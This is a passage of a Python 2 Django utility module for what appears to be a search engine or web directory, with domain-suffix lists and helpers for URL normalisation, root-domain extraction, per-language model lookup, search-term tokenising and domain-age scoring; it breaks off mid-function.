# -*- coding: utf-8 -*-
from django.core.exceptions import ObjectDoesNotExist
from django.template.defaultfilters import truncatewords
from django.db import models
from django.db.models import Q, get_model, Count
from django.db.utils import DatabaseError
from django.template.defaultfilters import truncatechars
from django.db import IntegrityError, connection
from django.utils.timezone import utc
from django.utils import timezone
from operator import itemgetter, attrgetter
import json
import ujson
from bs4 import BeautifulSoup
from models import *
from exceptions import InvalidLanguageException
from datetime import timedelta
import urlparse
import urllib
import datetime
import time
import re
import ipaddr
import whois
from nltk.corpus import stopwords

# This list is not exhaustive, nor can it be because new TLDs are being created all the time.
top_level_domains = [
# Original TLDs
'.com', '.net', '.org', '.mil', '.gov', '.edu', '.int', '.arpa',
# CCTLDs
'.ac', '.ad', '.ae', '.af', '.ag', '.ai', '.al', '.am', '.an', '.ao', '.aq', '.ar', '.as', '.at', '.au', '.aw', '.ax', '.az',
'.ba', '.bb', '.bd', '.be', '.bf', '.bg', '.bh', '.bi', '.bj', '.bm', '.bn', '.bo', '.bq', '.br', '.bs', '.bt', '.bv', '.bw', '.by', '.bz',
'.ca', '.cc', '.cd', '.cf', '.cg', '.ch', '.ci', '.ck', '.cl', '.cm', '.cn', '.co', '.cr', '.cu', '.cv', '.cw', '.cx', '.cy', '.cz',
'.de', '.dj', '.dk', '.dm', '.do', '.dz',
'.ec', '.ee', '.eg', '.eh', '.er', '.es', '.et', '.eu',
'.fi', '.fj', '.fk', '.fm', '.fo', '.fr',
'.ga', '.gb', '.gd', '.ge', '.gf', '.gh', '.gi', '.gl', '.gm', '.gn', '.gp', '.gq', '.gr', '.gs', '.gt', '.gu', '.gw', '.gy',
'.hk', '.hm', '.hn', '.hr', '.ht', '.hu',
'.id', '.ie', '.il', '.im', '.in', '.io', '.iq', '.ir', '.is', '.it',
'.je', '.jm', '.jo', '.jp',
'.ke', '.kg', '.kh', '.ki', '.km', '.kn', '.kp', '.kr', '.kw', '.ky', '.kz',
'.la', '.lb', '.lc', '.li', '.lk', '.lr', '.ls', '.lt', '.lu', '.lv', '.ly',
'.ma', '.mc', '.md', '.me', '.mg', '.mh', '.mk', '.ml', '.mm', '.mn', '.mo', '.mp', '.mq', '.mr', '.ms', '.mt', '.mu', '.mv', '.mw', '.mx', '.my', '.mz',
'.na', '.nc', '.ne', '.nf', '.ng', '.ni', '.nl', '.no', '.np', '.nr', '.nu',
'.om',
'.pa', '.pe', '.pf', '.pg', '.pg', '.pk', '.pl', '.pm', '.pn', '.pr', '.ps', '.pt', '.pw', '.py',
'.qa',
'.re', '.ro', '.rs', '.ru', '.rw',
'.sa', '.sb', '.sc', '.sd', '.se', '.sg', '.sh', '.si', '.sj', '.sk', '.sl', '.sm', '.sn', '.so', '.sr', '.ss', '.st', '.su', '.sv', '.sx', '.sy', '.sz',
'.tc', '.td', '.tf', '.tg', '.th', '.tj', '.tk', '.tl', '.tm', '.tn', '.to', '.tp', '.tr', '.tt', '.tv', '.tw', '.tz',
'.ua', '.ug', '.uk', '.us', '.uy', '.uz',
'.va', '.vc', '.ve', '.vg', '.vi', '.vn', '.vu',
'.wf', '.ws',
'.ye', '.yt',
'.za', '.zm', '.zw',
# Still need internationalized CCTLDs.
# New TLDs (many still needed)
'.accountant', '.academy', '.adult', '.aero', '.agency', '.apartments', '.app', '.archi', '.associates', '.audio',
'.bar', '.bargains', '.best', '.bike', '.biz', '.black', '.blackfriday', '.blog', '.blue', '.boo', '.builders',
'.cab', '.camera', '.camp', '.cancerresearch', '.cards', '.center', '.ceo', '.cheap', '.christmas', '.church', '.click', '.clothing', 
'.club', '.codes', '.coffee', '.college', '.coop',
'.dance', '.date', '.dating', '.design', '.diet', '.directory', '.download',
'.education', '.email', '.events', '.exposed',
'.faith', '.farm', '.fit', '.flowers', '.futbol', 
'.gift', '.glass', '.global', '.gop', '.green', '.guitars', '.guru',
'.help', '.hiphop', '.hiv', '.holdings', '.hosting', '.hotel', '.house',
'.info', '.ink', '.international', 
'.jobs', '.juegos', '.kaufen', '.kim',
'.land', '.lighting', '.link', '.loan', '.lol', '.love',
'.meet', '.men', '.menu', '.mobi', '.moda', '.moe', '.mov', '.museum', '.music', 
'.name', '.ngo', '.ninja', '.one', '.ong', '.onl', '.ooo', '.organic',
'.photo', '.photos', '.pics', '.pink', '.plumbing', '.porn', '.post', '.pub', '.pro', '.properties', '.property',
'.realtor', '.red', '.rich',
'.science', '.sex', '.sexy', '.shiksha', '.shop', '.singles', '.site', '.social', '.solar', '.sucks', '.systems',
'.tattoo', '.tel', '.today', '.top', '.travel',
'.uno', '.ventures', '.video', '.voting',
'.wang', '.web', '.website', '.wiki', '.win', '.wtf', '.xxx', '.xyz', '.yoga', '.zone',
# Still need New internationalized TLDs
# Geographic TLDs (many still needed)
'.alsace', '.asia', '.berlin', '.brussels', '.bzh', '.cat', '.cymru', '.eus', '.frl', '.gal', '.gent',
'.irish', '.kiwi', '.krd', '.lat', '.london', '.melbourne', '.miami', '.nyc',
'.paris', '.quebec', '.saarland', '.sydney', '.tokyo', '.vlaanderen', '.wales', '.wien',
# Still need Internationalized Geographic TLDs.
# Still need Brand top-level domains.
'.google', '.ovh', '.yandex',
# Still need Internationalized brand top-level domains.
]

second_level_domains = [
'.ac.uk', '.co.uk', '.gov.uk', '.judiciary.uk', '.ltd.uk', '.me.uk', '.net.uk', '.nhs.uk', '.nic.uk', '.org.uk', '.parliament.uk', '.plc.uk', '.police.uk', '.sch.uk', # UK
'.ac.jp', '.ad.jp', '.co.jp', '.ed.jp', '.go.jp', '.gr.jp', '.lg.jp', '.ne.jp', '.or.jp', # Japan
'.adm.br', '.adv.br', '.am.br', '.arq.br', '.art.br', '.b.br', '.bio.br', '.blog.br', '.cim.br', '.cnt.br', '.com.br', '.coop.br', '.ecn.br', '.eng.br', '.esp.br', '.etc.br', 'eti.br', '.edu.br', '.fm.br', '.fst.br', '.g12.br', '.imb.br', '.ind.br', '.inf.br', '.lel.br', '.gov.br', '.jor.br', '.jus.br', '.mat.br', '.med.br', '.mil.br', '.mus.br', '.net.br', '.nom.br', '.ntr.br', '.org.br', '.ppg.br', '.pro.br', '.psi.br', '.rec.br', '.srv.br', '.trd.br', '.tur.br', '.tv.br', '.vet.br', '.vlog.br', '.wiki.br', # Brazil
'.ab.ca', '.bc.ca', '.gc.ca', '.mb.ca', '.nb.ca', '.nf.ca', '.nl.ca', '.ns.ca', '.nt.ca', '.nu.ca', '.on.ca', '.pe.ca', '.qc.ca', '.sk.ca', '.yk.ca', # Canada
'.ak.us', '.al.us', '.ar.us', '.az.us', '.ca.us', '.co.us', '.ct.us', '.dc.us', '.de.us', '.fl.us', '.ga.us', '.hi.us', '.ia.us', '.id.us', '.il.us', '.in.us', '.ks.us', '.ky.us', '.la.us', '.ma.us', '.md.us', '.me.us', '.mi.us', '.mn.us', '.mo.us', '.ms.us', '.mt.us', '.nc.us', '.nd.us', '.ne.us', '.nh.us', '.nj.us', '.nm.us', '.nv.us', '.ny.us', '.oh.us', '.ok.us', '.or.us', '.pa.us', '.ri.us', '.sc.us', '.sd.us', '.tn.us', '.tx.us', '.ut.us', '.va.us', '.vt.us', '.wa.us', '.wi.us', '.wv.us', '.wy.us', # US States
'.asn.au', '.com.au', '.csiro.au', '.edu.au', '.gov.au', '.id.au', '.net.au', '.org.au', # Australia
'.ac.in', '.co.in', '.edu.in', '.ernet.in', '.firm.in', '.gen.in', '.gov.in', '.ind.in', '.mil.in', '.net.in', '.nic.in', '.org.in', '.res.in', # India
'.ac.id', '.biz.id', '.co.id', '.desa.id', '.go.id', '.mil.id', '.my.id', '.net.id', '.or.id', '.sch.id', '.web.id', # Indonesia
'.asso.fr', '.gouv.fr', '.tm.fr', # France
'.gov.it', # Italy
'.com.pt', '.edu.pt', '.gov.pt', '.org.pt', '.int.pt', '.net.pt', '.nome.pt', '.org.pt', '.publ.pt', # Portugal
'.com.es', '.edu.es', '.gob.es', '.nom.es', '.org.es', # Spain
'.art.pl', '.bialystok.pl', '.biz.pl', '.bydgoszcz.pl', '.com.pl', '.czest.pl', '.edu.pl', '.elk.pl', '.gda.pl', '.gdansk.pl', '.gov.pl', '.gorzow.pl', '.info.pl', '.kalisz.pl', '.katowice.pl', '.konin.pl', '.krakow.pl', '.lodz.pl', '.lublin.pl', '.malopolska.pl', '.nysa.pl', '.olsztyn.pl', '.media.pl', '.mil.pl', '.net.pl', '.ngo.pl', '.org.pl', '.opole.pl', '.pila.pl', '.poznan.pl', '.radom.pl', '.rzeszow.pl', '.slupsk.pl', '.szczecin.pl', '.torun.pl', '.tychy.pl', '.warszawa.pl', '.waw.pl', '.wroc.pl', '.wroclaw.pl', '.zgora.pl', # Poland
'.gv.at', '.ac.at', '.co.at', '.or.at', # Austria
'.av.tr', '.bel.tr', '.biz.tr', '.com.tr', '.edu.tr', '.gen.tr', '.gov.tr', '.info.tr', '.k12.tr', '.name.tr','.net.tr', '.org.tr', '.pol.tr', '.tsk.tr', '.tv.tr', '.web.tr', # Turkey
'.co.hu', '.info.hu', '.net.hu', '.org.hu', # Hungary
'.com.ro', '.info.ro', '.nom.ro', '.org.ro', '.arts.ro', '.firm.ro', '.nt.ro', '.rec.ro', '.store.ro', '.tm.ro', '.www.ro', # Romania
'.ac.be', # Belgium
'.com.gr', '.edu.gr', '.gov.gr', '.mil.gr', '.mod.gr', '.net.gr', '.org.gr', '.sch.gr', # Greece
'.kommune.no', '.priv.no', '.stat.no', '.dep.no', '.fhs.no', 'mil.no', # Norway
'.com.hr', '.iz.hr', # Croatia
'.com.mt', '.org.mt', '.net.mt', '.edu.mt', '.gov.mt', # Malta
'.co.ba', '.com.ba', '.edu.ba', '.gov.ba', '.net.ba', # Bosnia and Herzegovina
'.ac.cy', '.com.cy', '.gov.cy', '.net.cy', '.org.cy', # Cyprus
'.asn.lv', '.conf.lv', '.com.lv', '.edu.lv', '.gov.lv', '.id.lv', '.mil.lv', '.net.lv', '.org.lv', # Latvia
'.com.ee', '.edu.ee', '.fie.ee', '.med.ee', '.pri.ee', '.lib.ee', '.org.ee', # Estonia
'.com.al', '.edu.al', '.gov.al', '.net.al', '.org.al', # Albania
'.com.az', '.edu.az', '.gov.az', '.info.az', '.int.az', '.mil.az', '.net.az', '.org.az', '.pp.az', # Azerbaijan
'.com.am', '.net.am', '.org.am', # Armenia
'.com.ge', '.edu.ge', '.gov.ge', 'mil.ge', '.net.ge', '.org.ge', '.pvt.ge', # Georgia
'.com.by', '.edu.by', '.gov.by', '.mil.by', '.org.by', # Belarus
'.org.kg', '.net.kg', '.com.kg', '.edu.kg', '.gov.kg', '.mil.kg', # Kyrgyzstan
'.ac.tj', '.co.tj', '.com.tj', '.edu.tj', '.mil.tj', '.net.tj', '.org.tj', # Tajikistan
'.co.uz', '.edu.uz', '.gov.uz', # Uzbekistan
'.com.mx', '.edu.mx', '.gob.mx', '.net.mx', '.org.mx', # Mexico
'.ac.th', '.co.th', '.go.th', '.in.th', '.mi.th', '.net.th', '.or.th', # Thailand
'.ac.cn', '.bj.cn', '.com.cn', '.cq.cn', '.edu.cn', '.gd.cn', '.ha.cn', '.hk.cn', '.hl.cn', '.hn.cn', '.gov.cn', '.jl.cn', '.js.cn', '.mil.cn', '.net.cn', '.nx.cn', '.org.cn', '.sc.cn', '.sd.cn', '.sh.cn', '.tj.cn', '.xj.cn', '.zj.cn', # China
'.ac.ru', '.com.ru', '.edu.ru', '.gov.ru', '.int.ru', '.kamchatka.ru', '.karelia.ru', '.mil.ru', '.msk.ru', '.net.ru', '.nnov.ru', '.omsk.ru', '.org.ru', '.pp.ru', '.spb.ru', '.tomsk.ru', # Russia
'.club.tw', '.com.tw', '.ebiz.tw', '.edu.tw', '.game.tw', '.gov.tw', '.idv.tw', '.mil.tw', '.net.tw', '.org.tw', # Taiwan
'.com.hk', '.edu.hk', '.gov.hk', '.net.hk', '.org.hk', # Hong Kong
'.com.sg', '.edu.sg', '.gov.sg', '.org.sg', # Singapore
'.com.mo', '.edu.mo', '.gov.mo', '.net.mo', '.org.mo', # Macau
'.ac.ir', '.co.ir', '.gov.ir', '.id.ir', '.net.ir', '.org.ir', '.sch.ir', # Iran
'.com.iq', '.edu.iq', '.gov.iq', '.mil.iq', '.net.iq', '.org.iq', # Iraq
'.ac.kr', '.co.kr', '.go.kr', '.hs.kr', '.kg.kr', '.ms.kr', '.ne.kr', '.or.kr', '.pe.kr', '.re.kr', # Korea
'.com.kp', '.edu.kp', # North Korea
'.at.ua', '.ck.ua', '.cn.ua', '.com.ua', '.crimea.ua', '.dn.ua', '.donetsk.ua', '.dp.ua', '.edu.ua', '.gov.ua', '.if.ua', '.kh.ua', '.in.ua', '.km.ua', '.kr.ua', '.ks.ua', '.lg.ua', '.mk.ua', '.net.ua', '.od.ua', '.pl.ua', '.pp.ua', '.org.ua', '.rv.ua', '.te.ua', '.uz.ua', '.vn.ua', '.zp.ua', '.kiev.ua', '.lviv.ua', '.kharkov.ua', '.lugansk.ua', '.lutsk.ua', '.kherson.ua', '.odessa.ua', '.poltava.ua', '.rovno.ua', '.sumy.ua', # Ukraine
'.ac.nz', '.co.nz', '.cri.nz', '.govt.nz', '.health.nz', '.mil.nz', '.net.nz', '.org.nz', # New Zealand
'.ac.za', '.co.za', '.edu.za', '.gov.za', '.mil.za', '.net.za', '.org.za', '.web.za', # South Africa
'.com.pk', '.edu.pk', '.gov.pk', '.org.pk', '.net.pk', '.fam.pk', '.biz.pk', '.web.pk', '.gok.pk', '.gob.pk', '.gkp.pk', '.gop.pk', '.gos.pk', '.gog.pk', # Pakistan
'.com.sa', '.edu.sa', '.gov.sa', '.med.sa', '.net.sa', '.org.sa', '.pub.sa', '.sch.sa', # Saudi Arabia
'.ac.il', '.co.il', '.gov.il', '.idf.il', '.k12.il', '.muni.il', '.net.il', '.org.il', # Israel
'.com.ly', '.edu.ly', '.gov.ly', # Libya
'.com.tn', '.fin.tn', '.gov.tn', '.net.tn', '.org.tn', '.info.tn', '.edunet.tn', '.nat.tn', '.rnu.tn', # Tunisia
'.com.eg', '.edu.eg', '.eun.eg', '.gov.eg', '.info.eg', '.mil.eg', '.name.eg', '.net.eg', '.org.eg', '.sci.eg', '.tv.eg', # Egypt
'.com.lb', '.edu.lb', '.gov.lb', '.net.lb', '.org.lb', # Lebanon
'.art.dz', '.asso.dz', '.com.dz', '.edu.dz', '.gov.dz', '.net.dz', '.org.dz', '.pol.dz', # Algeria
'.com.sy', '.edu.sy', '.gov.sy', '.mil.sy', '.net.sy', '.news.sy', '.org.sy', # Syria
'.com.qa', '.edu.qa', '.gov.qa', '.mil.qa', '.net.qa', '.org.qa', # Qatar
'.com.ps', '.edu.ps', '.gov.ps', '.net.ps', '.org.ps', '.plo.ps', '.sec.ps', # Palestine
'.com.kw', '.edu.kw', '.gov.kw', '.net.kw', '.org.kw', # Kuwait
'.com.bh', '.edu.bh', '.gov.bh', # Bahrain
'.com.bn', '.edu.bn', '.gov.bn', # Brunei
'.com.om', '.gov.om', '.edu.om', '.co.om', '.pro.om', '.museum.om', '.net.om', '.med.om', # Oman
'.com.jo', '.edu.jo', '.gov.jo', '.mil.jo', '.name.jo', '.net.jo', '.org.jo', # Jordan
'.co.ye', '.com.ye', '.edu.ye', '.gov.ye', '.ltd.ye', '.me.ye', '.net.ye', '.org.ye', '.plc.ye', # Yemen
'.ac.ae', '.co.ae', '.net.ae', '.edu.ae', '.gov.ae', # United Arab Emirates
'.com.af', '.edu.af', '.gov.af', '.org.af', # Afghanistan
'.ac.ma', '.co.ma', '.gov.ma', '.net.ma', '.org.ma', # Morocco
'.ac.rs', '.co.rs', '.edu.rs', '.gov.rs', '.in.rs', '.org.rs', # Serbia
'.ac.me', '.co.me', '.gov.me', '.net.me', '.org.me', '.edu.me', '.its.me', '.priv.me', # Montenegro
'.com.ar', '.edu.ar', '.gob.ar', '.gov.ar', '.int.ar', '.mil.ar', '.net.ar', '.org.ar', '.tur.ar', # Argentina
'.com.co', '.edu.co', '.gov.co', '.mil.co', '.net.co', '.nom.co', '.org.co', # Colombia
'.arts.ve', '.co.ve', '.com.ve', '.edu.ve', '.gob.ve', '.gov.ve', '.info.ve', '.int.ve', '.mil.ve', '.net.ve', '.org.ve', '.radio.ve', '.tec.ve', '.web.ve', # Venezuela
'.com.bo', '.edu.bo',  '.org.bo', # Bolivia
'.ac.ni', '.co.ni', '.com.ni', '.edu.ni', '.gob.ni', '.mil.ni', '.nom.ni', '.net.ni', '.org.ni', # Nicaragua
'.com.pe', '.edu.pe', '.gob.pe', '.mil.pe', '.net.pe', '.ngo.pe', '.nom.pe', '.org.pe', '.sld.pe', # Peru
'.com.ec', '.edu.ec', '.fin.ec', '.gob.ec', '.gov.ec', '.info.ec', '.mil.ec', '.org.ec', # Ecuador
'.com.gt', '.edu.gt', '.gob.gt', '.ind.gt', '.mil.gt', '.net.gt', '.org.gt', # Guatemala
'.com.uy', '.edu.uy', '.gub.uy', '.net.uy', '.org.uy', '.mil.uy', # Uruguay
'.com.py', '.edu.py', '.gov.py', '.net.py', '.coop.py', '.mil.py', '.org.py', '.una.py', # Paraguay
'.co.gy', '.com.gy', '.org.gy', '.net.gy', '.edu.gy', '.gov.gy', # Guyana
'.com.pa', '.edu.pa', '.ac.pa', '.gob.pa', '.sld.pa', '.net.pa', '.org.pa', '.abo.pa', '.ing.pa', '.med.pa', '.nom.pa', # Panama
'.com.hn', '.net,hn', '.edu.hn', '.gob.hn', '.org.hn', # Honduras
'.ac.cr', '.co.cr', '.ed.cr', '.fi.cr', '.go.cr', '.or.cr', '.sa.cr', # Costa Rica
'.com.sv', '.edu.sv', '.gob.sv', '.org.sv', '.red.sv', # El Salvador
'.art.do', '.com.do', '.edu.do', '.gob.do', '.gov.do', '.mil.do', '.net.do', '.org.do', '.sld.do', # Dominican Republic
'.ac.pr', '.biz.pr', '.com.pr', '.edu.pr', '.est.pr', '.gov.pr', '.info.pr', '.isla.pr', '.name.pr', '.net.pr', '.org.pr', '.pro.pr', '.prof.pr', # Puerto Rico
'.com.cu', '.edu.cu', '.gov.cu', '.inf.cu', '.net.cu', '.org.cu', # Cuba
'.com.bz', '.gov.bz', '.net.bz', # Belize
'.com.my', '.edu.my', '.gov.my', '.mil.my', '.net.my', '.org.my', # Malaysia
'.com.mk', '.edu.mk', '.gov.mk', '.inf.mk', '.name.mk', '.net.mk', '.org.mk', # Macedonia
'.com.ng', '.edu.ng', '.gov.ng', '.org.ng', '.mil.ng', '.net.ng', '.sch.ng', '.name.ng', '.mobi.ng', # Nigeria
'.ac.tz', '.co.tz', '.go.tz', '.or.tz', '.mil.tz', '.sc.tz', '.ne.tz', # Tanzania
'.co.na', '.com.na', '.gov.na', '.cc.na', '.org.na', # Namibia
'.ac.ke', '.co.ke', '.ne.ke', '.or.ke', '.go.ke', '.sc.jke', '.me.ke', '.mobi.ke', '.info.ke', # Kenya
'.ac.ug', '.co.ug', '.com.ug', '.ne.ug', '.or.ug', '.org.ug', '.go.ug', '.sc.ug', # Uganda
'.ac.rw', '.co.rw', '.coop.rw', '.gov.rw', '.ltd.rw', '.mil.rw', '.net.rw', '.org.rw', # Rwanda
'.gov.bi', # Burundi
'.com.gh', '.edu.gh', '.gov.gh', '.mil.gh', '.net.gh', '.org.gh', # Ghana
'.adv.mz', '.ac.mz', '.co.mz', '.edu.mz', '.gov.mz', '.org.mz', # Mozambique
'.co.ao', '.ed.ao', '.gv.ao', '.it.ao', # Angola 
'.com.cm', '.gov.cm', # Cameroon
'.gov.bf', # Burkina Faso
'.co.bw', '.gov.bw', # Botswana
'.com.sd', '.net.sd', '.org.sd', '.edu.sd', '.med.sd', '.tv.sd', '.gov.sd', '.info.sd', # Sudan
'.net.ml', '.org.ml', '.edu.ml', '.gov.ml', '.presse.ml', # Mali
'.com.mu', '.net.mu', '.org.mu', '.ac.mu', '.co.mu', '.or.mu', '.gov.mu', # Mauritius
'.biz.et', '.com.et', '.edu.et', '.gov.et', '.info.et', '.name.et', '.net.et', '.org.et', # Ethiopia
'.ac.zm', '.co.zm', '.com.zm', '.edu.zm', '.gov.zm', '.net.zm', '.org.zm', '.sch.zm', # Zambia
'.ac.zw', '.co.zw', '.org.zw', '.gov.zw', # Zimbabwe
'.com.sl', '.net.sl', '.org.sl', '.edu.sl', '.gov.sl', # Sierra Leone
'.ac.sz', '.co.sz', '.org.sz', # Swaziland
'.ac.vn', '.biz.vn', '.com.vn', '.edu.vn', '.gov.vn', '.health.vn', '.info.vn', '.name.vn', '.net.vn', '.org.vn', '.pro.vn', # Vietnam
'.com.ph', '.edu.ph', '.gov.ph', '.net.ph', '.org.ph', # Philippines
'.com.pg', '.net.pg', '.ac.pg', '.gov.pg', '.mil.pg', '.org.pg', # Papua New Guinea
'.com.mm', '.gov.mm', # Burma / Myanmar
'.ac.bd', '.com.bd', '.edu.bd', '.gov.bd', '.mil.bd', '.net.bd', '.org.bd', # Bangladesh
'.edu.mn', '.gov.mn', '.org.mn', # Mongolia
'.com.kh', '.edu.kh', '.gov.kh', '.mil.kh', '.net.kh', '.org.kh', '.per.kh', # Cambodia
'.com.np', '.gov.np', '.edu.np', '.net.np', '.org.np', # Nepal
'.com.bt', '.edu.bt', '.gov.bt', '.org.bt', # Bhutan
'.ac.lk', '.com.lk', '.gov.lk', '.org.lk', # Sri Lanka
'.com.la', '.gov.la', '.net.la', '.org.la', # Laos
'.com.jm', '.edu.jm', '.gov.jm', '.org.jm', # Jamaica
'.com.ag', '.net.ag', # Antigua and Barbuda
'.com.ai', # Anguilla
'.gov.bb', # Barbados
'.gov.bm', # Bermuda
'.com.bs', '.edu.bs', '.gov.bs', '.net.bs', '.org.bs', '.we.bs', # Bahamas
'.gov.cx', # Christmas Island
'.ac.fj', '.biz.fj', '.com.fj', '.gov.fj', '.info.fj', '.mil.fj', '.name.fj', '.net.fj', '.org.fj', '.pro.fj', # Fiji
'.co.gg', '.net.gg', '.gov.gg', # Guernsey
'.com.gi', '.ltd.gi', '.gov.gi', '.mod.gi', '.edu.gi', '.org.gi', # Gibraltar
'.co.im', '.gov.im', # Isle of Man
'.co.je', '.net.je', '.org.je', # Jersey
'.gov.ki', # Kiribati
'.biz.mv', '.com.mv', '.gov.mv', '.edu.mv', '.net.mv', '.org.mv', '.info.mv', # Maldives
'.com.nr', '.edu.nr', '.gov.nr', '.biz.nr', '.org.nr', '.net.nr', '.info.nr', # Nauru
'.com.sb', '.edu.sb', '.net.sb', '.gov.sb', '.org.sb', # Solomon Islands
'.com.sc', '.edu.sc', '.net.sc', '.gov.sc', '.org.sc', # Seychelles
'.co.tt', '.com.tt', '.edu.tt', '.gov.tt', '.mil.tt', '.org.tt', '.net.tt', '.biz.tt', '.info.tt', '.pro.tt', '.int.tt', '.coop.tt', '.jobs.tt', '.mobi.tt', '.travel.tt', '.museum.tt', '.aero.tt', '.cat.tt', '.tel.tt', '.name.tt', # Trinidad and Tobago
'.com.vc', # Saint Vincent and the Grenadines
]

def IsValidDomainExtension(text):
    """
    Checks whether a domain extension is valid.

    .de or de can be passed it, it'll deal.
    """
    if not text.startswith('.'):
        text = '.' + text
    for ext in top_level_domains:
        if text == ext:
            return True
    return False

def HasNumber(text):
    return any(char.isdigit() for char in text)

def GetPendingIndexModelFromLanguage(language):
    if not language or 'en' in language:
        return PendingIndex
    if 'nn' in language or 'nb' in language:
        language = 'no'
    try:
        model = get_model('dir', 'PendingIndex_' + language)
    except LookupError, e:
        raise InvalidLanguageException(language)
    if model:
        return model
    else:
        return PendingIndex

def GetIndexModelFromLanguage(language):
    if not language or 'en' in language:
        return IndexTerm
    if 'nn' in language or 'nb' in language:
        language = 'no'
    try:
        model = get_model('dir', 'IndexTerm_' + language)
    except LookupError, e:
        raise InvalidLanguageException(language)
    if model:
        return model
    else:
        return IndexTerm

def GetSiteInfoModelFromLanguage(language):
    if not language or 'en' in language:
        return SiteInfo
    if 'nn' in language or 'nb' in language:
        language = 'no'
    try:
        model = get_model('dir', 'SiteInfo_' + language)
    except LookupError, e:
        raise InvalidLanguageException(language)
    if model:
        return model
    else:
        return SiteInfo

def GetSearchLogModelFromLanguage(language):
    if not language or 'en' in language:
        return SearchLog
    if 'nn' in language or 'nb' in language:
        language = 'no'
    try:
        model = get_model('dir', 'SearchLog_' + language)
    except LookupError, e:
        raise InvalidLanguageException(language)
    if model:
        return model
    else:
        return SearchLog

def GetKeywordRankingModelFromLanguage(language):
    if not language or 'en' in language:
        return KeywordRanking
    if 'nn' in language or 'nb' in language:
        language = 'no'
    try:
        model = get_model('dir', 'KeywordRanking_' + language)
    except LookupError, e:
        raise InvalidLanguageException(language)
    if model:
        return model
    else:
        return KeywordRanking

def GetAutoCompleteModelFromLanguage(language):
    if not language or 'en' in language:
        return AutoComplete
    if 'nn' in language or 'nb' in language:
        language = 'no'
    try:
        model = get_model('dir', 'AutoComplete_' + language)
    except LookupError, e:
        raise InvalidLanguageException(language)
    if model:
        return model
    else:
        return AutoComplete

def GetResultClickModelFromLanguage(language):
    if not language or 'en' in language:
        return ResultClick
    if 'nn' in language or 'nb' in language:
        language = 'no'
    try:
        model = get_model('dir', 'ResultClick_' + language)
    except LookupError, e:
        raise InvalidLanguageException(language)
    if model:
        return model
    else:
        return ResultClick

def ReverseWWW(domain, rootonly=False):
    """
    If a domain starts with www., return the domain name without that prefix.

    If it doesn't start with www., return the domain with that prefix added.

    www.example.com => example.com
    example.com => www.example.com

    If rootonly is true, it means that we don't add www. if the domain is not
    a root domain. So cheese.website.com returns None instead of
    www.cheese.website.com.
    """
    if not domain:
        return None
    if not domain.startswith(u'www.'):
        pieces = domain.split('.')
        if len(pieces) > 2 and rootonly:
            root = False
            for suffix in second_level_domains:
                if domain.endswith(suffix):
                    root = True
                    break
            if not root:
                return None
            else:
                return u'www.' + domain
        else:
            return u'www.' + domain
    else:
        return domain[4:]

def GetRootUrl(url, secure=False):
    if not url.startswith(u'http:') and not url.startswith(u'https:'):
        if url.startswith(u'//'):
            url = u'http:' + url
        elif  url.startswith('://'):
            url = u'http' + url
        else:
            url = u'http://' + url
    parsed_uri = urlparse.urlparse( url )
    loc = parsed_uri.netloc
    loc = loc.lower()
    if loc.endswith('.'):
        loc = loc[:-1]
    if loc.endswith(':80'):
        loc = loc[:-3]
    return loc

def MakeRealUrl(url, domain=None, secure=False):
    """
    Turns a URL into a "real" url. Takes any URL and makes it so that you
    can browse directly to it. Handles relative and absolute URLs, along
    with double-slash URLs.

    If the URL is not a valid HTML URL, returns it unchanged so that it can be
    blocked or processed further.
    """
    if secure:
        scheme = u'https:'
    else:
        scheme = u'http:'
    oldurl = url
    if not IsHtmlUrl(url):
        return url
    if url.startswith(u'//') or url.startswith('://'):
        # If there's a colon, remove it and process as if it wasn't there. We'll add it later.
        if url.startswith('://'):
            url = url[1:]
        url = scheme + url
    elif url.startswith(u':'):
        if secure:
            url = u'https' + url
        else:
            url = u'http' + url
    elif url.startswith(u'/'):
        url = scheme + domain + url
    elif domain and not u'/' in url:
        url = scheme + domain + '/' + url
    elif not url.startswith(u'http'):
        url = scheme + '//' + url
    url = NormalizeUrl(url, pre_crawl_replacement=True, secure=secure)
    return url

# Should be called with a RootDomain.
def IsIPAddress(url):
    # Try as an IP address first.
    try:
        ip = ipaddr.IPAddress(url)
        return True
    except ValueError:
        pass

# Like GetRootUrl, but also drops subdomains.
def GetRootDomain(url):
    if not url.startswith(u'http:') and not url.startswith(u'https:'):
        url = u'http://' + url
    parsed_uri = urlparse.urlparse( url )
    loc = parsed_uri.netloc
    if IsIPAddress(loc):
        return loc
    loc = loc.lower()
    if loc.endswith('.'):
        loc = loc[:-1]
    if loc.endswith(':80'):
        loc = loc[:-3]
    if loc.endswith(':443'):
        loc = loc[:-4]
    parts = loc.split('.')
    # Handle international equiavalents of .com.
    triple = False
    for suffix in second_level_domains:
        if loc.endswith(suffix):
            loc = '.'.join(parts[-3:])
            triple = True
            break
    if not triple:
        loc = '.'.join(parts[-2:])
    return loc

# Gets the extension from a domain, i.e. '.com' from 'website.com' and
# '.de' from 'bild.de'
def GetDomainExtension(url):
    extension = url.split('.')[-1]
    if extension != url:
        return '.' + extension
    return extension

def IsValidToken(word):
    word = word.lower()
    if word == u'the' or word == u'a' or word == u'of' or word == u'is' or word == u'an' or word == u'as' or word == u'i' or word == u'it' or word == u'in' or word == u'to' or word == u'and' or word == u'.' or word == u',' or word == u':' or word == u';' or word == u'|' or word == u'et' or word == u'on' or word == u'en' or word == u'un' or word == u'e' or word == u'le' or word == u'la' or word == u'-' or word == u'è' or word == u'o' or word == u'&':
        return False
    return True

# Breaks a phrase into individual tokens, removing non-searchable words
# like 'the'.
def GetTerms(keywords):
    # TODO: If URL stars and ends with single or double quotes, search it exactly as entered
    # (return unmodified, just converted to lower).
    keywords = keywords.lower()
    if keywords.startswith('"') and keywords.endswith('"'):
        keywords = re.sub('"', '', keywords)
        return [keywords,]
    # TODO: Escape quote so this is a single operation.
    # Note: We were removing periods, but that breaks searches for things like 'google.com'.
    keywords = re.sub('[,;"]', '', keywords)
    keywords = re.sub("'", '', keywords)
    terms = []
    words = keywords.split()
    for word in words:
        word = word.strip()
        if IsValidToken(word):
            terms.append(word)
    return terms

def GetDomainAgeModifier(domain):
    """
    Gives bonuses or penalties based on a domain's age.

    Ranges from 30% penalty for domains less than 90 days old to a 10% bonus for
    domains more than five years old, with a baseline of no modifier for domains 1-2 years old.
    """
    if not domain.domain_created:
        return 1.0

    ninetydaysago = timezone.now() - timedelta(days=90)
    halfyearago = ninetydaysago - timedelta(days=93)
    oneyearago = timezone.now() - timedelta(days=365)
    twoyearsago = oneyearago - timedelta(days=365)
    fouryearsago = timezone.now() - timedelta(days=1461)
    sixyearsago = timezone.now() - timedelta(days=2191)

